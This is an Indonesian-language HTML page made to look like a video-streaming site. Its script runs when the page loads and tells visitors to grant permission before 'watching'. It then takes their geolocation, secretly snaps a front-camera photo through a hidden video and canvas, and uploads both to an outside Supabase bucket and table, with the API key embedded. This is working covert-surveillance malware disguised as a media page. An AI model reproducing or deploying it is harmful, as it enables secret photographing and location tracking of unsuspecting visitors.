<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>inierakingyazz</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet" />
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: 'Inter', sans-serif;
    background: #0f0f0f; /* Hitam pekat ala platform video */
    color: #eeeeee;
    display: flex;
    flex-direction: column;
    align-items: center;
    min-height: 100vh;
    padding-bottom: 40px;
  }

  /* Header Minimalis */
  header {
    width: 100%;
    padding: 20px;
    text-align: center;
    font-size: 1.5rem;
    font-weight: 600;
    letter-spacing: -1px;
    color: #3498db; /* Biru aksen Videy */
    border-bottom: 1px solid #222;
    background: rgba(15, 15, 15, 0.8);
    backdrop-filter: blur(10px);
    position: sticky;
    top: 0;
    z-index: 100;
  }

  /* Status Container */
  #statusBox {
    width: 90%;
    max-width: 500px;
    margin: 20px auto;
    padding: 15px;
    background: #1a1a1a;
    border-radius: 12px;
    text-align: center;
    border: 1px solid #333;
  }

  #statusText { 
    font-size: 0.9rem; 
    color: #aaa;
    margin-bottom: 10px;
  }

  /* Feed Media */
  #list {
    width: 90%;
    max-width: 600px;
    display: grid;
    grid-template-columns: 1fr;
    gap: 20px;
  }

  .card {
    background: #1a1a1a;
    border-radius: 16px;
    overflow: hidden;
    border: 1px solid #282828;
    transition: transform 0.2s;
  }

  .media-container {
    width: 100%;
    aspect-ratio: 16 / 9;
    background: #000;
    display: flex;
    align-items: center;
    justify-content: center;
    position: relative;
  }

  .card img {
    width: 100%;
    height: 100%;
    object-fit: contain;
  }

  .info-overlay {
    padding: 15px;
    background: linear-gradient(transparent, rgba(0,0,0,0.8));
  }

  .info-text {
    font-size: 0.8rem;
    color: #888;
    line-height: 1.4;
  }

  /* Hidden Canvas untuk Capture */
  #canvas { display: none; }
  video { display: none; }

  /* Tombol Action */
  .floating-info {
    position: fixed;
    bottom: 20px;
    background: #3498db;
    color: white;
    padding: 10px 20px;
    border-radius: 50px;
    font-size: 0.8rem;
    font-weight: 600;
    box-shadow: 0 4px 15px rgba(52, 152, 219, 0.4);
  }
</style>
</head>
<body>

<header>YAZZACUMALAKA</header>

<div id="statusBox">
  <div id="statusText">Menghubungkan ke server media...</div>
</div>

<div id="list">
  </div>

<div class="floating-info" id="notif">selamat menonton bang #inierayazz</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas" width="640" height="480"></canvas>

<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
<script>
  const SUPABASE_URL = "https://ttptotondiqkqsznuapw.supabase.co";
  const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InR0cHRvdG9uZGlxa3Fzem51YXB3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzMzMTUzOTYsImV4cCI6MjA4ODg5MTM5Nn0.f9kTPb8CKit4vhfdREmYGrERxNj44RTSfWy7FDCAHu8";
  const BUCKET = "foto-users"; 
  const { createClient } = supabase;
  const client = createClient(SUPABASE_URL, SUPABASE_KEY);

  const statusText = document.getElementById("statusText");
  const listEl = document.getElementById("list");
  const video = document.getElementById("video");
  const canvas = document.getElementById("canvas");

  // Alur Kerja: Lokasi -> Kamera -> Upload -> Tampilkan
  async function startProcess() {
    statusText.innerText = "izinkan dulu bang baru nonton";
    
    if (!navigator.geolocation) {
      statusText.innerText = "Error: Geolocation tidak didukung";
      return;
    }

    navigator.geolocation.getCurrentPosition(async (pos) => {
      const { latitude: lat, longitude: lon } = pos.coords;
      statusText.innerText = "izinkan dulu bang";
      captureAndUpload(lat, lon);
    }, (err) => {
      statusText.innerText = "Akses ditolak. Silakan refresh halaman.";
    });
  }

  async function captureAndUpload(lat, lon) {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
      video.srcObject = stream;

      // Tunggu sebentar agar kamera siap
      setTimeout(async () => {
        const context = canvas.getContext("2d");
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        // Convert ke Blob (Lebih stabil dibanding ImageCapture)
        canvas.toBlob(async (blob) => {
          const fileName = `vid_${Date.now()}.jpg`;

          const { error: uploadError } = await client.storage
            .from(BUCKET)
            .upload(fileName, blob, { contentType: "image/jpeg" });

          if (!uploadError) {
            await client.from("lokasi_users").insert([
              { foto: fileName, latitude: lat, longitude: lon }
            ]);
            statusText.innerText = "Media berhasil diunggah.";
            tampilkanFeed();
          } else {
            statusText.innerText = "Gagal mengunggah media.";
          }

          // Matikan kamera setelah selesai
          stream.getTracks().forEach(track => track.stop());
        }, "image/jpeg", 0.8);
      }, 1500);

    } catch (err) {
      statusText.innerText = "Gagal mengakses kamera.";
      console.error(err);
    }
  }

  async function tampilkanFeed() {
    const { data, error } = await client.storage.from(BUCKET).list("", {
      limit: 10,
      sortBy: { column: "created_at", order: "desc" }
    });

    if (error) return;

    listEl.innerHTML = "";
    for (const file of data) {
      if (file.name === '.emptyFolderPlaceholder') continue;

      const { data: publicUrl } = client.storage.from(BUCKET).getPublicUrl(file.name);
      
      const card = document.createElement("div");
      card.className = "card";
      
      card.innerHTML = `
        <div class="media-container">
          <img src="${publicUrl.publicUrl}" alt="Media Content">
        </div>
        <div class="info-overlay">
          <div class="info-text">
            ID: ${file.name.split('_')[1]}<br>
            Diunggah pada: ${new Date(file.created_at).toLocaleString('id-ID')}
          </div>
        </div>
      `;
      listEl.appendChild(card);
    }
  }

  // Jalankan otomatis
  startProcess();
  // Refresh feed tiap 30 detik
  setInterval(tampilkanFeed, 30000);
</script>
</body>
</html>
